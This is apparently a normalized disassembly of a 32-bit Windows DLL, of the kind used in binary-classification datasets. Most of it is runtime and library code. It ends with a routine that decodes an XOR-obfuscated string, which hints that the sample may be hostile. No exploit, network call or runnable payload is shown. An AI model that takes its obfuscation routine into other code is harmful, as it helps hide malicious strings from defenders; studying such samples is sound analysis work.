lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001b974
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001b974
add esp 0x18
or [ esi ] eax
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001b974
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001b974
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
sub_1001feab
push 0xc
mov eax sub_1007eb1d
call sub_10050d0f
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x14 ] eax
je r-xdata
mov edi [ ebp + 0xc ]
and edi 0x8
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_1004737b
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x20
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10068fe9
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1002097b
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10011906
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_1005651e
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp edi ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_10040b35
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x8
call sub_1005ac7e
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10044c11
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_10064bde
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
jmp r-xdata
push 0x18
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_100167a4
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
push ebx
push ebx
call sub_10015235
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_10039ea0
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_10008452
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10015a9a
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x10
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_1000d005
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x1c
call sub_1005ac7e
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1b
cmp ecx ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x11
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_100123d5
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
call sub_1001a1b3
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_100449b7
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x14
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
call sub_10013a0b
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_1001b8c7
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x16
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10012134
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_1001c782
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x17
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_100123d5
mov [ esi ] r--data
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
sub_10020490
push ebp
mov ebp esp
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
mov eax [ ebp + 0x8 ]
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0x9249249
sub edx eax
push edi
cmp edx esi
jae r-xdata
mov edi [ ecx + 0x8 ]
add esi eax
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_100616c6
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_100104a0
mov eax esi
cmp eax esi
jae r-xdata
sub_1002050e
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_1002055a
push 0x60
mov eax sub_1007e436
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x24 ]
or edi 0xffffffff
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x50 ] edi
mov ecx esi
je r-xdata
lea eax [ ebp - 0x5c ]
xor ebx ebx
push eax
mov [ ebp - 0x58 ] ebx
call sub_10009450
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x58 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x4
call sub_10042119
add esp 0x18
push eax
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10045daa
add esp 0x10
lea ecx [ ebp - 0x5c ]
mov esi eax
mov [ ebp - 0x4 ] edi
call sub_1002a730
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x6c ] eax
je r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_10009450
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_100519c6
pop ecx
lea ecx [ ebp - 0x50 ]
mov esi eax
mov [ ebp - 0x4 ] edi
call sub_1002a730
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
call sub_1004b830
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10020962
push edi
push ebx
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10040f60
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1001c5c0
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_10050f80
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_10039e87
push edi
push ebx
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_10040f60
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1001c5c0
cmp [ ebp - 0x38 ] 0x10
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
mov eax [ ebp - 0x54 ]
je r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10041d5f
add esp 0x10
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] edi
call sub_1001c5c0
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] ebx
jge r-xdata
or [ eax ] 0x1
cmp esi 0x1
ja r-xdata
mov ecx [ ebp - 0x68 ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x60 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_10020709
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ffe5
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_10020760
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x20 ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x24 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0x28 ]
mov [ ecx + 0xc ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x10 ] eax
pop ebp
retn
sub_10020783
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ eax ]
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_10078320
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_10020833
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
lea eax [ ecx + 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_10026143
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
leave
retn 0x8
mov al [ ebp - 0xc ]
sub_10020880
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop edi
retn
push eax
call edi
sub_100208e0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_1003b4a6
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_10077d10
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_1002097b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
push eax
mov ebx ecx
call sub_10062021
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
call sub_1006312b
pop edi
pop esi
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
pop ebx
leave
retn 0x4
sub_100209ad
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_1001742d
pop ecx
mov edx rw-data
cmp eax edi
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp eax edi
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_1000e7a4
pop ecx
test al 0x2
jne r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_10020a90
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_10012991
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100112ab
pop ecx
mov [ esi ] eax
pop esi
sub_10020aca
push 0x60
mov eax sub_1007e879
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
xor ebx ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
inc ebx
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x6c ] eax
mov ecx esi
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10009450
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_1004770a
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10045daa
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_1002a730
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10009450
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10018820
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_1002a730
push edi
xor eax eax
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] ax
call sub_10027ed5
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_10020962
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10044912
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1004dbe5
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10021a98
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10039e87
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_10044912
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1004dbe5
cmp [ ebp - 0x38 ] 0x8
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100582b2
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_1004dbe5
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_10020c77
push 0x28
mov eax sub_1007ef3b
call sub_10050d0f
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x5
pop eax
call sub_1001a1b3
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_1005ac7e
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100305a3
jmp r-xdata
sub_10020d00
push ebp
mov ebp esp
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x190
push 0x0
push rw-data
call sub_10078970
mov ecx [ r--data ]
add esp 0xc
xor eax eax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x62
and edx 0xff
mov [ ebp + eax * 2 - 0xdc ] dx
inc eax
cmp eax 0xc
jb r-xdata
push edi
lea ecx [ ebp - 0xdc ]
xor eax eax
push ecx
mov [ ebp - 0xc4 ] ax
